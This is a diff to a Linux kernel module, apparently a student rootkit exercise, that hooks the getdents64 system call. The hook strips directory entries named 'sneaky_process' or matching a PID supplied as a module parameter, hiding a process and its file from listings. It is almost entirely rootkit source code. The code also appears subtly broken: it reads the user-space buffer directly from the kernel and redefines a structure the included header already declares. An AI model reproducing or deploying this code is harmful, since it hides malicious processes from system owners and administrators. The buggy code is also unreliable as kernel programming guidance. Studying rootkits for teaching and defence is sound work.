@@ -8,6 +8,8 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/uaccess.h>
+#include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
 
@@ -64,11 +66,55 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 
 
 /*                             getdents64                               */
-asmlinkage int (*original_getdents64)(struct pt_regs *);
-asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
-{
+struct linux_dirent64 {
+    u64        d_ino;
+    s64        d_off;
+    unsigned short d_reclen;
+    unsigned char  d_type;
+    char       d_name[];
+};
+// for hiding the pid
+MODULE_LICENSE("GPL");
+static int sneaky_pid = 0;
+module_param(sneaky_pid, int, 0);
+MODULE_PARM_DESC(sneaky_pid, "PID of the sneaky process");
 
-  return (*original_getdents64)(regs);
+
+asmlinkage int (*original_getdents64)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
+{
+  // stop and redefine the sys call of original_getdents64
+  unsigned int fd = regs->di;
+  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
+  unsigned int count = regs->dx;
+
+  // snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
+
+  int nread = original_getdents64(regs);
+  if (nread <= 0) {
+    return nread;
+  }
+
+  // use loop to check and hide the pid of sneaky process
+  struct linux_dirent64 *d;
+  int bpos = 0;
+  char pid_str[10];
+  snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
+  for (; bpos < nread;) {
+    d = (struct linux_dirent64 *)((char *)dirp + bpos);
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid_str) == 0) {
+      int reclen = d->d_reclen;
+      memmove(d, (char *)d + reclen, nread - bpos - reclen);
+      nread -= reclen;
+    }
+    else {
+      bpos += d->d_reclen;
+    }
+  }
+
+  // return (*original_getdents64)(regs);
+  return nread;
 }
 
 // The code that gets executed when the module is loaded
